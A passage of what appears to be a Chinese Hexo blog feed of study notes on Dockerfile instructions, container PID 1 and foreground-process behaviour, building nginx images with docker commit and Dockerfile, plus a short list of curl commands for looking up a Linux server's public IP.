]</code></pre></div><p>这就是为什么我们可以使用环境变量的原因，因为这些环境变量会被 shell 进行解析处理。</p><h1 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h1><p><code>ENTRYPOINT</code> 的格式和 <code>RUN</code> 指令格式一样，分为 <code>exec</code> 格式和 <code>shell</code> 格式。</p><p><code>exec</code>形式下<code>ENTRYPOINT</code>与<code>CMD</code>组成的完整命令：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">executable CMD</code></pre></div><p><code>shell</code>形式下<code>ENTRYPOINT</code>与<code>CMD</code>组成的完整命令（不建议使用）：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sh -c &quot;executable&quot; CMD</code></pre></div><p><code>ENTRYPOINT</code>作为目标入口。例：在<code>ubuntu</code>中默认的<code>ENTRYPOINT</code>其实就是<code>/bin/bash</code>。</p><p><code>ENTRYPOINT + CMD </code>加起来组成了容器起动时的指令。当我们想把目标镜像作为一个一次性运行的程序时，则在<code>ENTRYPOINT</code>中设置可执行命令，在<code>CMD</code>中设置参数。</p><p>比如有一个二进制的可执行文件square，需要一个参数，对其求平方值。那么我们可以打一个平方工具的镜像：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM baseImageADD square &#x2F;usr&#x2F;bin&#x2F;RUN chmod +x &#x2F;usr&#x2F;bin&#x2F;squareENTRYPOINT [&quot;&#x2F;usr&#x2F;bin&#x2F;square&quot;]CMD [&quot;2&quot;]</code></pre></div><p>那么，打出来镜像后（假设镜像名为squareImage:1.0），我们就可以这样使用镜像，这个命令会直接输出结果4，然后容器退出。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker run squareImage:1.0</code></pre></div><p>当然，我们还可以在docker run的时候覆盖CMD，如下命令会直接输出结果9，然后容器退出。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker run squareImage:1.0 3</code></pre></div><h2 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h2><h3 id="ENV-设置环境变量"><a href="#ENV-设置环境变量" class="headerlink" title="ENV 设置环境变量"></a>ENV 设置环境变量</h3><p>格式有两种：</p><ul><li><code>ENV &lt;key&gt; &lt;value&gt;</code></li><li><code>ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</code></li></ul><p>这个指令很简单，就是设置环境变量而已，无论是后面的其它指令，如 <code>RUN</code>，还是运行时的应用，都可以直接使用这里定义的环境变量。</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">ENV VERSION&#x3D;1.0 DEBUG&#x3D;on NAME&#x3D;&quot;Happy Feet&quot;</code></pre></div><h3 id="ARG-构建参数"><a href="#ARG-构建参数" class="headerlink" title="ARG 构建参数"></a>ARG 构建参数</h3><p>格式：<code>ARG &lt;参数名&gt;[=&lt;默认值&gt;]</code></p><p>构建参数和 <code>ENV</code> 的效果一样，都是设置环境变量。所不同的是，<code>ARG</code> 所设置的是<strong>构建环境的环境变量（参数）</strong>，在将来容器运行时是不会存在这些环境变量的。但是不要因此就使用 <code>ARG</code> 保存密码之类的信息，因为 <code>docker history</code> 还是可以看到所有值的。</p><p><code>Dockerfile</code> 中的 <code>ARG</code> 指令是定义参数名称，以及定义其默认值。该默认值可以在构建命令 <code>docker build</code> 中用 <code>--build-arg &lt;参数名&gt;=&lt;值&gt;</code> 来覆盖。</p><h3 id="VOLUME-定义匿名卷"><a href="#VOLUME-定义匿名卷" class="headerlink" title="VOLUME 定义匿名卷"></a>VOLUME 定义匿名卷</h3><p>格式为：</p><ul><li><code>VOLUME [&quot;&lt;路径1&gt;&quot;, &quot;&lt;路径2&gt;&quot;...]</code></li><li><code>VOLUME &lt;路径&gt;</code></li></ul><p>为了防止运行时用户忘记将动态文件所保存目录挂载为卷，在 <code>Dockerfile</code> 中，我们可以事先指定某些目录挂载为匿名卷，这样在运行时如果用户不指定挂载，其应用也可以正常运行，不会向容器存储层写入大量数据。</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">VOLUME &#x2F;data</code></pre></div><h3 id="EXPOSE-暴露端口"><a href="#EXPOSE-暴露端口" class="headerlink" title="EXPOSE 暴露端口"></a>EXPOSE 暴露端口</h3><p>格式为 <code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code>。</p><p><code>EXPOSE</code> 指令是声明容器运行时提供服务的端口，这只是一个声明，在容器运行时并不会因为这个声明应用就会开启这个端口的服务。</p><h3 id="WORKDIR-指定工作目录"><a href="#WORKDIR-指定工作目录" class="headerlink" title="WORKDIR 指定工作目录"></a>WORKDIR 指定工作目录</h3><p>格式为 <code>WORKDIR &lt;工作目录路径&gt;</code>。</p><p>使用 <code>WORKDIR</code> 指令可以来指定工作目录（或者称为当前目录），以后各层的当前目录就被改为指定的目录，如该目录不存在，<code>WORKDIR</code> 会帮你建立目录。类似于<code>Dockerfile</code>中的<code>cd</code>指令。</p><blockquote><p>一些初学者常犯的错误是把 <code>Dockerfile</code> 等同于 Shell 脚本来书写，这种错误的理解还可能会导致出现下面这样的错误：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">RUN cd &#x2F;appRUN echo &quot;hello&quot; &gt; world.txt</code></pre></div><p>如果将这个 <code>Dockerfile</code> 进行构建镜像运行后，会发现找不到 <code>/app/world.txt</code> 文件，或者其内容不是 <code>hello</code>。原因其实很简单，在 Shell 中，连续两行是同一个进程执行环境，因此前一个命令修改的内存状态，会直接影响后一个命令；而在 <code>Dockerfile</code> 中，这两行 <code>RUN</code> 命令的执行环境根本不同，是两个完全不同的容器。这就是对 <code>Dockerfile</code> 构建分层存储的概念不了解所导致的错误。</p><p>之前说过每一个 <code>RUN</code> 都是启动一个容器、执行命令、然后提交存储层文件变更。第一层 <code>RUN cd /app</code> 的执行仅仅是当前进程的工作目录变更，一个内存上的变化而已，其结果不会造成任何文件变更。而到第二层的时候，启动的是一个全新的容器，跟第一层的容器更完全没关系，自然不可能继承前一层构建过程中的内存变化。</p></blockquote><h3 id="USER-指定当前用户"><a href="#USER-指定当前用户" class="headerlink" title="USER 指定当前用户"></a>USER 指定当前用户</h3><p>格式：<code>USER &lt;用户名&gt;[:&lt;用户组&gt;]</code></p><p><code>USER</code> 是改变之后层的执行 <code>RUN</code>, <code>CMD</code> 以及 <code>ENTRYPOINT</code> 这类命令的身份。注意，<code>USER</code> 只是帮助你切换到指定用户而已，这个用户必须是事先建立好的，否则无法切换。</p><h2 id="容器中应用前台执行与后台执行问题"><a href="#容器中应用前台执行与后台执行问题" class="headerlink" title="# 容器中应用前台执行与后台执行问题"></a># 容器中应用前台执行与后台执行问题</h2><blockquote><p>注：区别与容器在<code>docker</code>中的前后台运行（<code>docker run -d</code>），是两码事。本处指容器中的应用在容器中前后台运行问题。</p><p><strong>结论：</strong></p><p><strong>容器必须要一个前台进程并且作为<code>pid=1</code>的主进程。（大概等于bash必须始终在占用）</strong></p><p><strong>容器会随着<code>pid=1</code>进程的结束而结束。</strong></p></blockquote><h3 id="情景一"><a href="#情景一" class="headerlink" title="情景一"></a>情景一</h3><blockquote><p>默认<code>nginx</code>镜像启动容器，或<code>FROM nginx</code>但未指定<code>CMD</code>。</p></blockquote><p><code>nginx</code>应用会正常启动并运行在后台，原因是<code>nginx</code>默认镜像中<code>CMD</code>为前台运行：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile"># docker-nginx&#x2F;Dockerfile-alpine.template···CMD [&quot;nginx&quot;, &quot;-g&quot;, &quot;daemon off;&quot;]</code></pre></div><h3 id="情景二"><a href="#情景二" class="headerlink" title="情景二"></a>情景二</h3><blockquote><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM nginxCMD [&quot;nginx&quot;,&quot;-g&quot;,&quot;daemon off;&quot;]</code></pre></div></blockquote><p><code>nginx</code>应用会正常启动并运行在后台，且<code>nginx</code>会作为<code>pid=1</code>进程。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">UID         PID   PPID  C STIME TTY          TIME CMDroot          1      0  0 01:29 ?        00:00:00 nginx: master process nginx -g daemon off;nginx         5      1  0 01:29 ?        00:00:00 nginx: worker process</code></pre></div><h3 id="情景三"><a href="#情景三" class="headerlink" title="情景三"></a>情景三</h3><blockquote><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM nginxCMD [nginx -g daemon off;]</code></pre></div></blockquote><p><code>nginx</code>应用会正常启动并运行在后台，但<code>nginx</code>不会作为<code>pid=1</code>进程。</p><p>因为<code>CMD</code>的<code>shell</code>模式实际会被理解成<code>CMD [&quot;sh&quot;, &quot;-c&quot;, &quot;nginx -g daemon off;&quot;]</code></p><p>其中<code>sh</code>所存在的进程会被作为第一个前台进程，进而<code>sh</code>的<code>pid=1</code>，执行内容为<code>nginx -g daemon off;</code>。</p><p>因为<code>sh</code>（<code>pid=1</code>）进程在启动<code>nginx</code>（<code>pid=5</code>）b这个子进程后会阻塞，直到<code>nginx</code>子进程退出返回，<code>sh</code>父进程才会继续往前走。而<code>nginx</code>是一个循环任务，它不会返回，所以<code>sh</code>进程会一直阻塞，不会结束。既然<code>pid=1</code>的进程一直都在，那么容器也不会退出。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">UID         PID   PPID  C STIME TTY          TIME CMDroot          1      0  0 01:34 ?        00:00:00 &#x2F;bin&#x2F;sh -c nginx -g &#39;daemon off;&#39;root          5      1  0 01:34 ?        00:00:00 nginx: master process nginx -g daemon off;nginx         6      5  0 01:34 ?        00:00:00 nginx: worker process</code></pre></div><h3 id="情景四"><a href="#情景四" class="headerlink" title="情景四"></a>情景四</h3><blockquote><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM nginxCMD [&quot;service&quot;, &quot;nginx&quot;, &quot;start&quot;]</code></pre></div></blockquote><p><code>nginx</code>应用不会正常启动且运行在后台。</p><p>因为<code>bash</code>执行了<code>service nginx start</code>这个瞬时命令后，继续向后。<code>service</code>进程结束，容器结束。</p><h3 id="情景五"><a href="#情景五" class="headerlink" title="情景五"></a>情景五</h3><blockquote><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM nginxCMD [service nginx start]</code></pre></div></blockquote><p><code>nginx</code>应用不会正常启动且运行在后台。</p><p>因为<code>bash</code>执行了<code>sh -c service nginx start</code>这个瞬时命令，<code>sh</code>（<code>pid=1</code>）在执行<code>service</code>后结束。<code>sh</code>进程结束，容器结束。</p><hr><blockquote><p>参考：</p><p><a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p><p><a href="https://github.com/nginxinc/docker-nginx/blob/master/Dockerfile-alpine.template">https://github.com/nginxinc/docker-nginx/blob/master/Dockerfile-alpine.template</a></p><p><a href="https://pshizhsysu.gitbook.io/docker/dockerfile/qian-tai-yun-xing">https://pshizhsysu.gitbook.io/docker/dockerfile/qian-tai-yun-xing</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Dockerfile</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux查看公网IP</title>
    <link href="/posts/9fba094f/"/>
    <url>/posts/9fba094f/</url>
    
    <content type="html"><![CDATA[<div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">curl cip.cccurl ifconfig.mecurl ifconfig.me&#x2F;allcurl www.pubyun.com&#x2F;dyndns&#x2F;getipcurl members.3322.org&#x2F;dyndns&#x2F;getip</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>IP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker实践——构建镜像</title>
    <link href="/posts/8db4d4b4/"/>
    <url>/posts/8db4d4b4/</url>
    
    <content type="html"><![CDATA[<h2 id="1-利用commit理解镜像构成"><a href="#1-利用commit理解镜像构成" class="headerlink" title="1. 利用commit理解镜像构成"></a>1. 利用commit理解镜像构成</h2><p>镜像是多层存储，每一层是在前一层的基础上进行的修改；而容器同样也是多层存储，是在以镜像为基础层，在其基础上加一层作为容器运行时的存储层。</p><p>现在让我们以定制一个 Web 服务器为例子，来讲解镜像是如何构建的。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker run --name webserver -d -p 80:80 nginx</code></pre></div><p>这条命令会用 <code>nginx</code> 镜像启动一个容器，命名为 <code>webserver</code>，并且映射了 80 端口，这样我们可以用浏览器去访问这个 <code>nginx</code> 服务器。</p><p>如果是在本机运行的 Docker，那么可以直接访问：<code>http://localhost</code> ，如果是在虚拟机、云服务器上安装的 Docker，则需要将 <code>localhost</code> 换为虚拟机地址或者实际云服务器地址。<em>（阿里云等托管服务器需要开启进出端口的安全策略）</em></p><p>直接用浏览器访问的话，我们会看到默认的 Nginx 欢迎页面。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; curl http:&#x2F;&#x2F;localhost&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;&#x2F;title&gt;&lt;style&gt;···</code></pre></div><p>现在，假设我们非常不喜欢这个欢迎页面，我们希望改成欢迎 Docker 的文字，我们可以使用 <code>docker exec</code> 命令进入容器，修改其内容。</p><p>我们以交互式终端方式进入 <code>webserver</code> 容器，并执行了 <code>bash</code> 命令，也就是获得一个可操作的 Shell。</p><p>然后，我们用 <code>&lt;h1&gt;Hello, Docker!&lt;/h1&gt;</code> 覆盖了 <code>/usr/share/nginx/html/index.html</code> 的内容。</p><p>现在我们再刷新浏览器的话，会发现内容被改变了。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker exec -it webserver bashroot@191550cc1461:&#x2F;# echo &#39;&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.htmlroot@191550cc1461:&#x2F;# exitexit&gt; curl http:&#x2F;&#x2F;localhost&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;</code></pre></div><p>我们修改了容器的文件，也就是改动了容器的存储层。我们可以通过 <code>docker diff</code> 命令看到具体的改动。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker diff webserverC &#x2F;usrC &#x2F;usr&#x2F;shareC &#x2F;usr&#x2F;share&#x2F;nginxC &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;htmlC &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.htmlC &#x2F;usr&#x2F;localA &#x2F;usr&#x2F;local&#x2F;aegisA &#x2F;usr&#x2F;local&#x2F;aegis&#x2F;aegis_clientA &#x2F;usr&#x2F;local&#x2F;aegis&#x2F;aegis_client&#x2F;aegis_10_91A &#x2F;usr&#x2F;local&#x2F;aegis&#x2F;aegis_client&#x2F;aegis_10_91&#x2F;dataA &#x2F;usr&#x2F;local&#x2F;aegis&#x2F;aegis_client&#x2F;aegis_10_91&#x2F;data&#x2F;data.3C &#x2F;varC &#x2F;var&#x2F;cacheC &#x2F;var&#x2F;cache&#x2F;nginxA &#x2F;var&#x2F;cache&#x2F;nginx&#x2F;uwsgi_tempA &#x2F;var&#x2F;cache&#x2F;nginx&#x2F;client_tempA &#x2F;var&#x2F;cache&#x2F;nginx&#x2F;fastcgi_tempA &#x2F;var&#x2F;cache&#x2F;nginx&#x2F;proxy_tempA &#x2F;var&#x2F;cache&#x2F;nginx&#x2F;scgi_tempC &#x2F;rootA &#x2F;root&#x2F;.bash_historyC &#x2F;runA &#x2F;run&#x2F;nginx.pidC &#x2F;etcC &#x2F;etc&#x2F;nginxC &#x2F;etc&#x2F;nginx&#x2F;conf.dC &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf</code></pre></div><p>现在我们定制好了变化，我们希望能将其保存下来形成镜像。</p><p><strong>要知道，当我们运行一个容器的时候（如果不使用卷的话），我们做的任何文件修改都会被记录于容器存储层里。而 Docker 提供了一个 <code>docker commit</code> 命令，可以将容器的存储层保存下来成为镜像。换句话说，就是在原有镜像的基础上，再叠加上容器的存储层，并构成新的镜像。以后我们运行这个新镜像的时候，就会拥有原有容器最后的文件变化。</strong></p><p><code>docker commit</code> 的语法格式为：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</code></pre></div><p>我们可以用下面的命令将容器保存为镜像：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker commit --author &quot;leex0&quot; --message &quot;modify the index page&quot; webserver nginx:v2sha256:5cf8e96643187e1ee2f006b5518526eadc0205080cdd880a693fc38bb70a747a</code></pre></div><p>其中 <code>--author</code> 是指定修改的作者，而 <code>--message</code> 则是记录本次修改的内容。这点和 <code>git</code> 版本控制相似，不过这里这些信息可以省略留空。</p><p>我们可以在 <code>docker image ls</code> 中看到这个新定制的镜像：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker image lsREPOSITORY     TAG       IMAGE ID       CREATED         SIZEnginx          v2        5cf8e9664318   2 minutes ago   133MBnginx          latest    f6d0b4767a6c   2 months ago    133MB</code></pre></div><p>我们还可以用 <code>docker history</code> 具体查看镜像内的历史记录，如果比较 <code>nginx:latest</code> 的历史记录，我们会发现新增了我们刚刚提交的这一层。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker history nginx:v2IMAGE          CREATED         CREATED BY                                      SIZE      COMMENT5cf8e9664318   2 minutes ago   nginx -g daemon off;                            1.39kB    modify the index pagef6d0b4767a6c   2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  CMD [&quot;nginx&quot; &quot;-g&quot; &quot;daemon…   0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  STOPSIGNAL SIGQUIT           0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  EXPOSE 80                    0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  ENTRYPOINT [&quot;&#x2F;docker-entr…   0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop) COPY file:0fd5fca330dcd6a7…   1.04kB&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop) COPY file:0b866ff3fc1ef5b0…   1.96kB&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop) COPY file:e7e183879c35719c…   1.2kB&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c set -x     &amp;&amp; addgroup --system -…   63.7MB&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  ENV PKG_RELEASE&#x3D;1~buster     0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  ENV NJS_VERSION&#x3D;0.5.0        0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  ENV NGINX_VERSION&#x3D;1.19.6     0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  LABEL maintainer&#x3D;NGINX Do…   0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop)  CMD [&quot;bash&quot;]                 0B&lt;missing&gt;      2 months ago    &#x2F;bin&#x2F;sh -c #(nop) ADD file:422aca8901ae3d869…   69.2MB</code></pre></div><p>新的镜像定制好后，我们可以来运行这个镜像。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker run --name web2 -d -p 81:80 nginx:v2cdb83092299d3362d99e2cfe4c5b88a4c8c25ff4c7dac90f46f34017f0114255&gt; curl http:&#x2F;&#x2F;localhost:81&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;</code></pre></div><p>这里我们命名为新的服务为 <code>web2</code>，并且映射到 <code>81</code> 端口。访问 <code>http://localhost:81</code> 看到结果，其内容应该和之前修改后的 <code>webserver</code> 一样。</p><p>至此，我们第一次完成了定制镜像，使用的是 <code>docker commit</code> 命令，手动操作给旧的镜像添加了新的一层，形成新的镜像，对镜像多层存储应该有了更直观的感觉。</p><h4 id="慎用-docker-commit"><a href="#慎用-docker-commit" class="headerlink" title="慎用 docker commit"></a>慎用 <code>docker commit</code></h4><p>使用 <code>docker commit</code> 命令虽然可以比较直观的帮助理解镜像分层存储的概念，但是实际环境中并不会这样使用。</p><p>因为这种操作会使镜像较为臃肿且较难维护，对于如何构建的镜像除了制作人外无从得知（黑箱操作）。</p><h2 id="2-使用-Dockerfile-定制镜像"><a href="#2-使用-Dockerfile-定制镜像" class="headerlink" title="2. 使用 Dockerfile 定制镜像"></a>2. 使用 Dockerfile 定制镜像</h2><blockquote><p>从上述的 <code>docker commit</code> 的学习中，我们可以了解到，镜像的定制实际上就是定制每一层所添加的配置、文件。如果我们可以把每一层修改、安装、构建、操作的命令都写入一个脚本，用这个脚本来构建、定制镜像，那么之前提及的无法重复的问题、镜像构建透明性的问题、体积的问题就都会解决。这个脚本就是 Dockerfile。</p></blockquote><p>Dockerfile 是一个文本文件，其内包含了一条条的 **指令(Instruction)**，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。</p><p>还以之前定制 <code>nginx</code> 镜像为例，这次我们使用 Dockerfile 来定制。</p><p>在一个空白目录中，建立一个文本文件，并命名为 <code>Dockerfile</code>：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mkdir mynginxcd mynginxtouch Dockerfile</code></pre></div><p>其内容为：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; cat DockerfileFROM nginxRUN echo &#39;&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html</code></pre></div><p>这个 Dockerfile 很简单，一共就两行。涉及到了两条指令，<code>FROM</code> 和 <code>RUN</code>。</p><h3 id="FROM-指定基础镜像"><a href="#FROM-指定基础镜像" class="headerlink" title="FROM 指定基础镜像"></a>FROM 指定基础镜像</h3><p>所谓定制镜像，那一定是以一个镜像为基础，在其上进行定制。就像我们之前运行了一个 <code>nginx</code> 镜像的容器，再进行修改一样，基础镜像是必须指定的。而 <code>FROM</code> 就是指定 <strong>基础镜像</strong>，<strong>因此一个 <code>Dockerfile</code> 中 <code>FROM</code> 是必备的指令，并且必须是第一条指令</strong>。</p><blockquote><p>在 <a href="https://hub.docker.com/search?q=&type=image&image_filter=official">Docker Hub</a> 上有非常多的高质量的官方镜像，有可以直接拿来使用的服务类的镜像，如 <a href="https://hub.docker.com/_/nginx/"><code>nginx</code></a>、<a href="https://hub.docker.com/_/redis/"><code>redis</code></a>、<a href="https://hub.docker.com/_/mongo/"><code>mongo</code></a>、<a href="https://hub.docker.com/_/mysql/"><code>mysql</code></a>、<a href="https://hub.docker.com/_/httpd/"><code>httpd</code></a>、<a href="https://hub.docker.com/_/php/"><code>php</code></a>、<a href="https://hub.docker.com/_/tomcat/"><code>tomcat</code></a> 等；也有一些方便开发、构建、运行各种语言应用的镜像，如 <a href="https://hub.docker.com/_/node"><code>node</code></a>、<a href="https://hub.docker.com/_/openjdk/"><code>openjdk</code></a>、<a href="https://hub.docker.com/_/python/"><code>python</code></a>、<a href="https://hub.docker.com/_/ruby/"><code>ruby</code></a>、<a href="https://hub.docker.com/_/golang/"><code>golang</code></a> 等。可以在其中寻找一个最符合我们最终目标的镜像为基础镜像进行定制。</p><p>如果没有找到对应服务的镜像，官方镜像中还提供了一些更为基础的操作系统镜像，如 <a href="https://hub.docker.com/_/ubuntu/"><code>ubuntu</code></a>、<a href="https://hub.docker.com/_/debian/"><code>debian</code></a>、<a href="https://hub.docker.com/_/centos/"><code>centos</code></a>、<a href="https://hub.docker.com/_/fedora/"><code>fedora</code></a>、<a href="https://hub.docker.com/_/alpine/"><code>alpine</code></a> 等，这些操作系统的软件库为我们提供了更广阔的扩展空间。</p><p>除了选择现有镜像为基础镜像外，Docker 还存在一个特殊的镜像，名为 <code>scratch</code>。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FROM scratch...</code></pre></div><p>如果你以 <code>scratch</code> 为基础镜像的话，意味着你不以任何镜像为基础，接下来所写的指令将作为镜像第一层开始存在。</p><p>不以任何系统为基础，直接将可执行文件复制进镜像的做法并不罕见，对于 Linux 下静态编译的程序来说，并不需要有操作系统提供运行时支持，所需的一切库都已经在可执行文件里了，因此直接 <code>FROM scratch</code> 会让镜像体积更加小巧。使用 <a href="https://golang.google.cn/">Go 语言</a> 开发的应用很多会使用这种方式来制作镜像，这也是为什么有人认为 Go 是特别适合容器微服务架构的语言的原因之一。</p></blockquote><h3 id="RUN-执行命令"><a href="#RUN-执行命令" class="headerlink" title="RUN 执行命令"></a>RUN 执行命令</h3><p><code>RUN</code> 指令是用来执行命令行命令的。由于命令行的强大能力，<code>RUN</code> 指令在定制镜像时是最常用的指令之一。其格式有两种：</p><ul><li><em>shell</em> 格式：<code>RUN &lt;命令&gt;</code>，就像直接在命令行中输入的命令一样。刚才写的 Dockerfile 中的 <code>RUN</code> 指令就是这种格式。</li></ul><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">RUN echo &#39;&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html</code></pre></div><ul><li><em>exec</em> 格式：<code>RUN [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;]</code>，这更像是函数调用中的格式。</li></ul><p>既然 <code>RUN</code> 就像 Shell 脚本一样可以执行命令，那么我们是否就可以像 Shell 脚本一样把每个命令对应一个 RUN 呢？比如这样（）：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM debian:stretchRUN apt-get updateRUN apt-get install -y gcc libc6-dev make wgetRUN wget -O redis.tar.gz &quot;http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.3.tar.gz&quot;RUN mkdir -p &#x2F;usr&#x2F;src&#x2F;redisRUN tar -xzf redis.tar.gz -C &#x2F;usr&#x2F;src&#x2F;redis --strip-components&#x3D;1RUN make -C &#x2F;usr&#x2F;src&#x2F;redisRUN make -C &#x2F;usr&#x2F;src&#x2F;redis install</code></pre></div><p>之前说过，Dockerfile 中每一个指令都会建立一层，<code>RUN</code> 也不例外。每一个 <code>RUN</code> 的行为，就和刚才我们手工建立镜像的过程一样：新建立一层，在其上执行这些命令，执行结束后，<code>commit</code> 这一层的修改，构成新的镜像。</p><p>而上面的这种写法，创建了 7 层镜像。这是完全没有意义的，而且很多运行时不需要的东西，都被装进了镜像里，比如编译环境、更新的软件包等等。结果就是产生非常臃肿、非常多层的镜像，不仅仅增加了构建部署的时间，也很容易出错。 这是很多初学 Docker 的人常犯的一个错误。</p><p><em>Union FS 是有最大层数限制的，比如 AUFS，曾经是最大不得超过 42 层，现在是不得超过 127 层。</em></p><p>上面的 <code>Dockerfile</code> 正确的写法应该是这样：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM debian:stretchRUN set -x; buildDeps&#x3D;&#39;gcc libc6-dev make wget&#39; \    &amp;&amp; apt-get update \    &amp;&amp; apt-get install -y $buildDeps \    &amp;&amp; wget -O redis.tar.gz &quot;http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.3.tar.gz&quot; \    &amp;&amp; mkdir -p &#x2F;usr&#x2F;src&#x2F;redis \    &amp;&amp; tar -xzf redis.tar.gz -C &#x2F;usr&#x2F;src&#x2F;redis --strip-components&#x3D;1 \    &amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis \    &amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis install \    &amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;* \    &amp;&amp; rm redis.tar.gz \    &amp;&amp; rm -r &#x2F;usr&#x2F;src&#x2F;redis \    &amp;&amp; apt-get purge -y --auto-remove $buildDeps</code></pre></div><p>首先，之前所有的命令只有一个目的，就是编译、安装 redis 可执行文件。因此没有必要建立很多层，这只是一层的事情。因此，这里没有使用很多个 <code>RUN</code> 一一对应不同的命令，而是仅仅使用一个 <code>RUN</code> 指令，并使用 <code>&amp;&amp;</code> 将各个所需命令串联起来。将之前的 7 层，简化为了 1 层。在撰写 Dockerfile 的时候，要经常提醒自己，这并不是在写 Shell 脚本，而是在定义每一层该如何构建。</p><blockquote><p>并且，这里为了格式化还进行了换行。Dockerfile 支持 Shell 